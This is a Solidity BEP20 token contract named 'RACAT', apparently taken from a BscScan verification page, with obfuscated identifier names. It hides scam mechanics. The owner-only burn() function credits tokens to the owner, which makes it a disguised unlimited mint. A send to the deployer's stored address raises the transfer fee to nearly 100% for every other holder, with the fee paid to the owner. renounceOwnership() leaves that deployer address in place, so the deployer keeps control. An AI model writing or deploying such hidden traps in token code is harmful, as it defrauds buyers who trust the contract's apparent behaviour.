/**
 *Submitted for verification at BscScan.com on 2022-11-18
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-18 15:44 03 GMT
 */
// SPDX-License-Identifier: MIT

pragma solidity >=0.6.0;
contract EEQDMBB {
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 private  IBWVPA = 10000000000000;
uint8 public constant decimals = 18;
address public owner;
uint256 private  MWTCBL = 1000000000000000000;
string public  name = "RACAT";
address private  XVDSFD = address(0);
mapping (address => uint256) public balanceOf;
address private  RECKAU = address(0);
uint256 private  JLEKFR = 1000000000000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
string public  symbol = "RACAT";
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 private  YIQICS = 10000000000;
uint256 public constant FBISYE = 99999;
address private  BDJLDH = address(0);
address private  TRHPPE = address(0);
uint256 private  WJHTGK = 1000000000000000000;
uint256 private  ARUJTK = 100000000;
event Transfer(address indexed from, address indexed to, uint256 value);
mapping (address => mapping (address => uint256)) private _allowances;
address private  YINQTJ = address(0);
uint256 private  MMFSVA = 1000000000000000000000;
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _getXVDSFD() private returns (address) {
return XVDSFD;
}

function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "ZXPDZA");
require(to != address(0), "ZXPDZA");
require(amount <= balanceOf[from], "ZXPDZA");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* FBISYE/MWTCBL ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==TRHPPE){
MWTCBL = FBISYE+2;
}
emit Transfer(from, to, transferAmount);
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tZXPDZA 0");
require(spender != address(0), "fZXPDZA 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _getIBWVPA() private returns (uint256) {
return IBWVPA;
}

function _getYINQTJ() private returns (address) {
return YINQTJ;
}

function _getMMFSVA() private returns (uint256) {
return MMFSVA;
}

function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _getRECKAU() private returns (address) {
return RECKAU;
}

function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _getARUJTK() private returns (uint256) {
return ARUJTK;
}

function _getJLEKFR() private returns (uint256) {
return JLEKFR;
}

function _getYIQICS() private returns (uint256) {
return YIQICS;
}

function _getBDJLDH() private returns (address) {
return BDJLDH;
}

constructor () {
TRHPPE = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _getWJHTGK() private returns (uint256) {
return WJHTGK;
}


}